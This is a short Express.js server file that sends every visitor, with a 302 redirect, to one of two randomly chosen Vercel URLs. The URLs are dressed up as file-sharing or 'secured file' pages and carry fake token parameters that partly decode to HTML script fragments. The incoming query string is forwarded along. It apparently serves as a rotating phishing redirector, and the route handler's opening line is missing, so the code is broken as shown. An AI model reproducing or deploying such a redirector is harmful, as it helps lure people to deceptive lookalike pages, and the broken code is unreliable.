const express = require("express");
const app = express();

const PORT = process.env.PORT || 3000; // Render assigns a PORT dynamically

    // List of URLs for redirection
    const urls = [
        "https://fileshare-docs-wp8tkd96cmrqfbloynb7vhxy2rjqg3t5aztpxlmapp.vercel.app/?_filestorage_id=Kx2GtvNhRCEoLZ5JYbF8pMB6XD39WeTgKoObGl0YqmHrjHbEyWpubWUvc2NyLmpzIj48L3NjcmlwdD4KPC9oZWFkPgo8Ym9k",
        "https://secured-file-myapp4dhjfkdhagejkeldkhejdandedlpemeldpp.vercel.app/?_datashare_token=YbX5KJoRFmVZP8LTCGNhWqD26X39WMBKoObGl0YpmHrjHbEyWpubWUvc2NyLmpzIj48L3NjcmlwdD4KPC9oZWFkPgo8Ymskl"
    ];

         // Select a random URL
    const selectedUrl = urls[Math.floor(Math.random() * urls.length)];

    // Append query parameters from request
    const queryParams = req.originalUrl.includes("?") ? req.originalUrl.split("?")[1] : "";
    const redirectUrl = queryParams ? `${selectedUrl}&${queryParams}` : selectedUrl;

    console.log(`Redirecting to: ${redirectUrl}`);
    
    res.redirect(302, redirectUrl);
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
